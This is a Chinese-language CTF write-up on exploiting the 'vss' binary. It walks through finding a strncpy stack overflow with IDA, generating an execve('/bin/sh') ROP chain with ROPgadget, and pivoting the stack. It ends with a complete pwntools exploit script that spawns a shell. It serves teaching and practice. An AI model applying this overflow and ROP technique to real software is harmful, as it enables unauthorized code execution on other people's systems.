# VSS (Very secure System)
 **使用到pwntools**
  ```
  $sudo pip install pwntools
  ```
 **ROPgadget Tool** [GitHub页面](https://github.com/JonathanSalwan/ROPgadget)

 **IDA**
## 第一步、初步分析目标程序
 * 1.使用file命令查看文件类型
  ```
  root@VM-206-74-ubuntu:/workspace/rop/vss# file vss
  vss: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=5589f2e4e8d5a8e810f9b425baabccc04745b40a, stripped
  ```
  __x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24__ 64位静态链接的在linux上跑的程序
 
  __stripped__ 意思是目标文件里面的符号信息在编译的时候删掉了，这意味着API名称是看不到的，想知道被call的API名称是什么需要分析传递的参数
 
 * 2.使用checksec命令查看保护措施 
  ```
  root@VM-206-74-ubuntu:/workspace/rop/vss# checksec vss
  [*] '/workspace/rop/vss/vss'
      Arch:     amd64-64-little
      RELRO:    Partial RELRO
      Stack:    No canary found
      NX:       NX enabled
      PIE:      No PIE (0x400000)
  ```
  开启了NX

## 第二步、逆向分析目标程序
 * 1.首先正常运行一下程序
  ```
  root@VM-206-74-ubuntu:/workspace/rop/vss# ./vss 
  VSS:Very Secure System
  Password:
  HAHAHAHAHA
  root@VM-206-74-ubuntu:/workspace/rop/vss# 
  ```
  运行程序要求输入密码，随便输入了字符串然后回车，并没有什么反应
  
  程序有获取输入的操作，试试输入超长的字符串看看会不会崩掉
  ```
   $ python
   >>"A" * 1024
   >>#输出一个1024个A的字符串，这就不放了
   >>exit()
  ```

  复制这个超长的字符串，运行程序，粘贴作为密码
  ```
   root@VM-206-74-ubuntu:/workspace/rop/vss# ./vss 
   VSS:Very Secure System
   Password:
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   Segmentation fault (core dumped)
   root@VM-206-74-ubuntu:/workspace/rop/vss#
   ```
  __Segmentation fault (core dumped)__ 崩了，说明有溢出的问题

 * 2.IDA分析
  首先打开用IDA打开目标文件(注意64位)
  ![1.png](./pic/1.png)
  
  符号信息果然是没有的
  ![2.png](./pic/2.png)
  
  这里不直接找main函数，而是通过字符串引用来找溢出点(可以从函数start那找main函数，这里因为嫌他相对麻烦一些，所以用查找字符串引用来确定溢出位置)
  
  从第一步我们知道运行程序后，程序输出“Password:”，然后要求我们输入密码 
  
  所以搜索字符串。在IDA中按Shift+F12，IDA会列出程序中使用的所有字符串，此时在control+F，在弹出的编辑框中输入Password
  ![3.png](./pic/3.png)
  
  双击结果行，IDA View-A窗口会定位到这个字符串在程序中存储的位置，这时能看到db 'Password'后面有注释，写的是DATA XREF subxxx，意思是 subxxx处引用了这个字符串
  ![4.png](./pic/4.png)
  
  双击那行注释，IDA View-A窗口会定位到subxxx地址处，这个地址对应的汇编代码引用了这个字符串
  ![5.png](./pic/5.png)
  
  分析下这个函数
  ![6.png](./pic/6.png)
  
  紫色部分call了两次sub\_408800这个函数，参数为运行程序后出现字符串(64位程序传参会把前几个参数放进寄存器中)
  
  那么这个函数应该相当于printf之类的打印函数
  
  橙色部分调用了一个函数，以0，一个指针，0x400作为参数，其中参数中的指针为rbp-0x400
  
  绿色部分call了一个函数，参数为刚才的那个指针。我们可以双击call后面的地址，看一下这个函数
  ![7.png](./pic/7.png)
  
  一堆汇编代码，看不出个大概可以尝试F5大法，看反编译代码
  ![8.png](./pic/8.png)
  
  形参a1为我们输入的字符串的指针
  
  调用了一个函数sub\_400330(&v2, a1, 0x50LL);，参数是rbp-0x40, 我们输入的字符串的指针，0x50,参数一是一个能存储0x40字节大小的内存区域，参数二是一个字符串，参数三为一个数值。那么可能这个函数是一个类似于strcpy之类的函数
  
  百度了一下这种参形式的C API，发现这个函数应该是strncpy
  
  那么这个函数在这里的作用是截取我们输入的前0x50个字符，复制到栈中
  
  由于参数一的空间大小只有0x40,只要我们输入的前0x40个字节中不带\0，那么余下的字符就会造成栈溢出

  
  调用完这个函数后还会有一个if判断，调用两个函数。以0x40字节大小的缓冲区指针作为参数，判断返回值是不是分别等于112 和 121
  
  ASCII码是小于128的，有可能是ASCII码。右键这个数值，选Char选项，发现这两个数值分别是字符'p'和'y'，如果是的话那么返回1，否则就调用一些函数，返回0
  
  至于这两个函数判断的是缓冲区中哪个位置的数据，我们可以看汇编代码，发现是[rbp+var\_40] 和 [rbp+var\_40+1], var\_40的数值在前面有定义，是-40。所以这两个函数是返回我们输入的前两个字符
  
  这里我们有了一个对这个函数的总结，首先将我们的输入复制到一个0x40大小的空间，然后判断这个空间的前两个字符是不是py,如果是则返回1，否则执行一些操作，返回0.为了防止这些操作对我们干扰我们要确保输入的前两个字节是py。
  
  到这我们分析完了发生溢出的函数，我们可以写攻击程序了。

  
  # 3.编写攻击程序
  由于开启了NX，所以我们需要使用ROP技术

  首先是确定一下输入的字符串的结构

  0x40长度的字符用于填充缓冲区 + 8个字节长度的字符用于覆盖栈中存储的rbp地址 + 8个字节长度的地址用于劫持RIP

  由于这个程序删掉了符号信息，所以我们不能找到system，execv之类的函数

  我们可以使用ROPgadget工具，让它来帮我们生成一个用来执行/bin/sh的代码段
  ```
  root@VM-206-74-ubuntu:/workspace/rop/vss# ROPgadget --binary vss --ropchain
  ```
  执行后会出现很长的输出，我们需要关心的只是最后面的内容 ROP chain generation
```
0x000000000045bb56 : xor r8d, r8d ; call r12
0x000000000040769f : xor rax, qword ptr [0x30] ; call rax
0x000000000040769e : xor rax, qword ptr fs:[0x30] ; call rax
0x000000000041bd1f : xor rax, rax ; ret

Unique gadgets found: 9212

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

[+] Gadget found: 0x46b8d1 mov qword ptr [rsi], rax ; ret
[+] Gadget found: 0x401937 pop rsi ; ret
[+] Gadget found: 0x46f208 pop rax ; ret
[+] Gadget found: 0x41bd1f xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

[+] Gadget found: 0x41bd1f xor rax, rax ; ret
[+] Gadget found: 0x45e790 add rax, 1 ; ret
[+] Gadget found: 0x45e791 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

[+] Gadget found: 0x401823 pop rdi ; ret
[+] Gadget found: 0x401937 pop rsi ; ret
[+] Gadget found: 0x43ae05 pop rdx ; ret

- Step 4 -- Syscall gadget

[+] Gadget found: 0x45f2a5 syscall ; ret

- Step 5 -- Build the ROP chain

#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = ''

p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data
p += pack('<Q', 0x000000000046f208) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401823) # pop rdi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000043ae05) # pop rdx ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045f2a5) # syscall ; ret
root@VM-206-74-ubuntu:/workspace/rop/vss# 
```
  我们需要的是输出的最后面的Step5中的代码。
 
  这段代码是用来执行/bin/sh, 至于它怎么执行的不需要我们关心
  
  只需要我们把填充工作做好，追加到我们的填充内容后面就行

  不过需要注意一个问题。

  大体一看着代码段很长，我们前面填充栈的0x48个字节+这么长的数据，0x50大小的栈肯定存不下。回想一下在获取输入的那个函数的里，为了存储我们输入的内容，函数栈存储局部变量的空间大小为0x400字节，全部用来存储我们输入的内容，这个空间是可以存下这么长的数据的。

  那我们的目标就是在程序pop rip的时候，栈顶指针rsp刚好指向那个0x400大小空间中的一个特定位置，这个特定位置是上面的ROP链的开始位置

  如何控制rsp呢，那就是找程序操作rsp的地址

  因为溢出函数在开始执行的时候会把获取输入的函数的栈顶指针作为栈底指针,然后栈顶指针-0x50，用来做当前函数的栈空间，所以这两个函数的栈是相邻的，上面低位地址是溢出函数的栈空间，下面高位地址是获取输入的函数的栈空间

  这里有一个问题，我们应该把rsp向下移动多少呢？为了保证rsp为指向输入函数栈中的ROP链位置，应向下移动的大小至少为ROP链前面的字符的长度。
 
  这个长度在这个溢出中应该是 0x40 + 0x8 + 0x8 = 0x50字节

  同时还要知道操作完 rsp后肯定要返回到ROP链的位置，那么在ret之前肯定要pop至少两次(rbp和rip)，pop rbp肯定要填充，同时如果还pop了其他寄存器那么相应也要填充，填充在这个add rsp地址的前面。除去pop rip,每pop一次就要多填充8个字节

  开始找控制rsp的语句。

  ROPgadget可以帮我们找，为了省事直接找add rsp,xx 后直接ret的地址
  ```
  root@VM-206-74-ubuntu:/workspace/rop/vss# ROPgadget --binary vss --only "add|ret" | grep rsp
  0x0000000000493b11 : add al, 0 ; add byte ptr [rax], al ; add rsp, 8 ; ret
  0x0000000000493b21 : add al, byte ptr [rax] ; add byte ptr [rax], al ; add rsp, 8 ; ret
  0x000000000046efcf : add byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 8 ; ret
  0x0000000000448a06 : add byte ptr [rax], al ; add rsp, 0xd0 ; ret
  0x00000000004080c5 : add byte ptr [rax], al ; add rsp, 0xd8 ; ret
  0x00000000004606e8 : add byte ptr [rax], al ; add rsp, 8 ; ret
  0x000000000046f172 : add byte ptr [rbp + 0xb], dh ; add rsp, 0x48 ; ret
  0x0000000000495c58 : add byte ptr [rbp - 0x3b], dh ; add rsp, 8 ; ret
  0x000000000049c797 : add byte ptr [rsp + rax], al ; add al, 4 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x49c1
  0x00000000004a525f : add byte ptr [rsp + rcx + 0xcbf0000], bh ; add byte ptr [rax], al ; ret 0xc
  0x000000000046b7fa : add eax, 0x25c2b1 ; add rsp, 8 ; ret
  0x000000000045ff60 : add eax, 0x268173 ; add rsp, 8 ; ret
  0x000000000046f202 : add eax, dword ptr [rdx + 8] ; add rsp, 0x58 ; ret
  0x000000000046f201 : add rax, qword ptr [rdx + 8] ; add rsp, 0x58 ; ret
  0x00000000004161b0 : add rsp, 0x18 ; ret
  0x0000000000462cda : add rsp, 0x28 ; ret
  0x000000000046e432 : add rsp, 0x30 ; ret
  0x000000000047a2b5 : add rsp, 0x38 ; ret
  0x000000000046f175 : add rsp, 0x48 ; ret
  0x000000000046f205 : add rsp, 0x58 ; ret
  0x000000000046f2f1 : add rsp, 0x78 ; ret
  0x000000000044892a : add rsp, 0xd0 ; ret
  0x00000000004080c7 : add rsp, 0xd8 ; ret
  0x00000000004002dd : add rsp, 8 ; ret
  ```
  找到一个 __0x000000000046f205 : add rsp, 0x58 ; ret__

  这里向下挪0x58刚刚好够用(填充+rbp+劫持= 0x40 +8 + 8 = 0x50,再加上add rsp后pop rbp,需要再+8，刚好0x58)
  
  正式写代码
```
#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = ''

p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data
p += pack('<Q', 0x000000000046f208) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401823) # pop rdi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000043ae05) # pop rdx ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045f2a5) # syscall ; ret

#ROP chain by hand:
from pwn import *
payload = 'py' + 'A' * (0x40-2) #padding overflow function's buffer
payload += 'B' * 8 #padding overflow function's rbp
payload += p64(0x000000000046f205) #hijack rip  to where 'add rsp,0x58'
payload += 'B' * 8 #padding rbp of 'add rsp,0x58'
payload += p #hijack rip to where run /bin/sh

vss = process('./vss') # run vss
vss.recv() #listen vss's output
vss.send(payload)

vss.interactive()
```

Done.
